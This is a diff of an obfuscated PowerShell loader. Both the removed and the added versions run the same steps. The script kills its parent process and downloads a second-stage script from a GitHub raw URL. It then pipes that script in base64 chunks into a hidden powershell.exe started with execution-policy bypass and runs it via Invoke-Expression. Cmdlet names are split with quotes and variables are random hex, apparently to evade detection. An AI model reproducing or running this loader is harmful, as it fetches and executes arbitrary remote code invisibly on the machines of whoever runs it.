@@ -1,41 +1,41 @@
-$58d2d2cf1c304fd99878f2f0db0f16c5 = $true
-$624356455f2d4b498ed7f77b13cab3be = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt"
-$9443c4e8dcb4486393da0995c46622bf = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Se''le''c''t -Expand ParentProcessId) 2>$null
-if ($9443c4e8dcb4486393da0995c46622bf) { S''t''o''p''-''P''r''o''c''e''s''s -Id $9443c4e8dcb4486393da0995c46622bf -Force -ErrorAction SilentlyContinue }
-$39baad366a224accaecbf791d7a5d93b = (New-Object Net.WebClient).DownloadString($624356455f2d4b498ed7f77b13cab3be)
-$a7dc136451504f4fa078ec0ca17f8f16 = New''-''Ob''j''e''ct System.Diagnostics.ProcessStartInfo
-$a7dc136451504f4fa078ec0ca17f8f16.FileName = "powershell.exe"
-$a7dc136451504f4fa078ec0ca17f8f16.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass"
-$a7dc136451504f4fa078ec0ca17f8f16.UseShellExecute = $false
-$a7dc136451504f4fa078ec0ca17f8f16.RedirectStandardInput = $true
-$a7dc136451504f4fa078ec0ca17f8f16.RedirectStandardOutput = $true
-$a7dc136451504f4fa078ec0ca17f8f16.RedirectStandardError = $true
-$a7dc136451504f4fa078ec0ca17f8f16.CreateNoWindow = $true
-$52a87e6406534d218a5b6043d1a0062f = [System.Diagnostics.Process]::Start($a7dc136451504f4fa078ec0ca17f8f16)
-$52a87e6406534d218a5b6043d1a0062f.BeginOutputReadLine()
-$52a87e6406534d218a5b6043d1a0062f.BeginErrorReadLine()
-S''tar''t-Sl''e''ep -Seconds 1.2
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.WriteLine('$8a551b395efa4af8ab4ff74a4eb1018f = "SilentlyContinue"')
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.Flush()
-S''tart-Sl''ee''p -Milliseconds 200
-$7310360d4c1b4534ae97386bc3901dd8 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($39baad366a224accaecbf791d7a5d93b))
-$dd7c6126e95943d2ab70fbcaecc4bf0a = 2000
-$6f3adf09ebd4447ebdb1d438d08791e7 = [Math]::Ceiling($7310360d4c1b4534ae97386bc3901dd8.Length / $dd7c6126e95943d2ab70fbcaecc4bf0a)
-if (-not $58d2d2cf1c304fd99878f2f0db0f16c5) { W''r''it''e''-''H''o''s''t "[*] Invio script in $6f3adf09ebd4447ebdb1d438d08791e7 chunk da $dd7c6126e95943d2ab70fbcaecc4bf0a char (totale B64: $($7310360d4c1b4534ae97386bc3901dd8.Length))" -ForegroundColor Cyan }
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.WriteLine('$3712072a8a3b4e62952e28a8fd55828d = ""')
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.Flush()
-Sta''rt-Sl''eep -Milliseconds 150
-for ($3ca30aa2a7b24a0abcccac63846a4fca = 0; $3ca30aa2a7b24a0abcccac63846a4fca -lt $7310360d4c1b4534ae97386bc3901dd8.Length; $3ca30aa2a7b24a0abcccac63846a4fca += $dd7c6126e95943d2ab70fbcaecc4bf0a) {
-    $13e44573f9a84a7eb38221b0a0064bf5 = $7310360d4c1b4534ae97386bc3901dd8.Substring($3ca30aa2a7b24a0abcccac63846a4fca, [Math]::Min($dd7c6126e95943d2ab70fbcaecc4bf0a, $7310360d4c1b4534ae97386bc3901dd8.Length - $3ca30aa2a7b24a0abcccac63846a4fca))
-    $9605b3e3c6b24e7ca81f2f4bc1a145d8 = [Math]::Floor($3ca30aa2a7b24a0abcccac63846a4fca / $dd7c6126e95943d2ab70fbcaecc4bf0a) + 1
-    if (-not $58d2d2cf1c304fd99878f2f0db0f16c5) { W''rite-Host "[$9605b3e3c6b24e7ca81f2f4bc1a145d8/$6f3adf09ebd4447ebdb1d438d08791e7] Invio chunk..." -ForegroundColor Yellow }
-    $52a87e6406534d218a5b6043d1a0062f.StandardInput.WriteLine('$3712072a8a3b4e62952e28a8fd55828d += "' + $13e44573f9a84a7eb38221b0a0064bf5 + '"')
-    $52a87e6406534d218a5b6043d1a0062f.StandardInput.Flush()
-    Sta''r''t''-''Sl''e''ep -Milliseconds 100
+$5cb3751e0fbc4500bc39dbd3c6f78af7 = $true
+$51dfcf2902cd4786a56a898ce3c3eed0 = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt"
+$d476fd4eee4848c59984d7cc51d9cef2 = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Sel''ec''t -Expand ParentProcessId) 2>$null
+if ($d476fd4eee4848c59984d7cc51d9cef2) { St''op''-''Process -Id $d476fd4eee4848c59984d7cc51d9cef2 -Force -ErrorAction SilentlyContinue }
+$52cfa9271086489d868b3f36ba4b65a5 = (New-Object Net.WebClient).DownloadString($51dfcf2902cd4786a56a898ce3c3eed0)
+$0d51fc0a148d4c07b0e370432ee38949 = N''ew-Obj''e''c''t System.Diagnostics.ProcessStartInfo
+$0d51fc0a148d4c07b0e370432ee38949.FileName = "powershell.exe"
+$0d51fc0a148d4c07b0e370432ee38949.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass"
+$0d51fc0a148d4c07b0e370432ee38949.UseShellExecute = $false
+$0d51fc0a148d4c07b0e370432ee38949.RedirectStandardInput = $true
+$0d51fc0a148d4c07b0e370432ee38949.RedirectStandardOutput = $true
+$0d51fc0a148d4c07b0e370432ee38949.RedirectStandardError = $true
+$0d51fc0a148d4c07b0e370432ee38949.CreateNoWindow = $true
+$d7944ed49e6842cdae5d94fadfa6157d = [System.Diagnostics.Process]::Start($0d51fc0a148d4c07b0e370432ee38949)
+$d7944ed49e6842cdae5d94fadfa6157d.BeginOutputReadLine()
+$d7944ed49e6842cdae5d94fadfa6157d.BeginErrorReadLine()
+S''ta''rt''-Sl''eep -Seconds 1.2
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.WriteLine('$901c8b2983054261986fdfe3bc911c61 = "SilentlyContinue"')
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.Flush()
+S''t''ar''t-''S''l''eep -Milliseconds 200
+$6a749db13f2743cea03ad093f7a34307 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($52cfa9271086489d868b3f36ba4b65a5))
+$5b4207858674403f967872d06b91fe28 = 2000
+$bf9c6a16aa804dc18cbf6df17db32086 = [Math]::Ceiling($6a749db13f2743cea03ad093f7a34307.Length / $5b4207858674403f967872d06b91fe28)
+if (-not $5cb3751e0fbc4500bc39dbd3c6f78af7) { Write''-''Host "[*] Invio script in $bf9c6a16aa804dc18cbf6df17db32086 chunk da $5b4207858674403f967872d06b91fe28 char (totale B64: $($6a749db13f2743cea03ad093f7a34307.Length))" -ForegroundColor Cyan }
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.WriteLine('$dbc225e33bcb4995ab73e43ee5026720 = ""')
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.Flush()
+Sta''rt-Slee''p -Milliseconds 150
+for ($e51423dc8bc44c7ba9e4455dbd5805b3 = 0; $e51423dc8bc44c7ba9e4455dbd5805b3 -lt $6a749db13f2743cea03ad093f7a34307.Length; $e51423dc8bc44c7ba9e4455dbd5805b3 += $5b4207858674403f967872d06b91fe28) {
+    $ddb8b8f3ea094c72814872c6acc73382 = $6a749db13f2743cea03ad093f7a34307.Substring($e51423dc8bc44c7ba9e4455dbd5805b3, [Math]::Min($5b4207858674403f967872d06b91fe28, $6a749db13f2743cea03ad093f7a34307.Length - $e51423dc8bc44c7ba9e4455dbd5805b3))
+    $e89279647bbd457a93d5b206eca7447b = [Math]::Floor($e51423dc8bc44c7ba9e4455dbd5805b3 / $5b4207858674403f967872d06b91fe28) + 1
+    if (-not $5cb3751e0fbc4500bc39dbd3c6f78af7) { W''r''i''te-''H''o''s''t "[$e89279647bbd457a93d5b206eca7447b/$bf9c6a16aa804dc18cbf6df17db32086] Invio chunk..." -ForegroundColor Yellow }
+    $d7944ed49e6842cdae5d94fadfa6157d.StandardInput.WriteLine('$dbc225e33bcb4995ab73e43ee5026720 += "' + $ddb8b8f3ea094c72814872c6acc73382 + '"')
+    $d7944ed49e6842cdae5d94fadfa6157d.StandardInput.Flush()
+    St''ar''t-S''l''e''ep -Milliseconds 100
 }
-if (-not $58d2d2cf1c304fd99878f2f0db0f16c5) { Write''-''Ho''st "[*] Esecuzione script..." -ForegroundColor Green }
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.WriteLine('[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($3712072a8a3b4e62952e28a8fd55828d)) | Invoke-Expression')
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.Flush()
-St''ar''t''-''S''l''e''e''p -Milliseconds 500
-$52a87e6406534d218a5b6043d1a0062f.StandardInput.Close()
-if (-not $58d2d2cf1c304fd99878f2f0db0f16c5) { Wr''i''te-H''o''s''t "[+] Done." -ForegroundColor Green }
+if (-not $5cb3751e0fbc4500bc39dbd3c6f78af7) { W''rite-Hos''t "[*] Esecuzione script..." -ForegroundColor Green }
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.WriteLine('[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($dbc225e33bcb4995ab73e43ee5026720)) | Invoke-Expression')
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.Flush()
+S''tart-Slee''p -Milliseconds 500
+$d7944ed49e6842cdae5d94fadfa6157d.StandardInput.Close()
+if (-not $5cb3751e0fbc4500bc39dbd3c6f78af7) { Wr''i''t''e''-''H''o''st "[+] Done." -ForegroundColor Green }
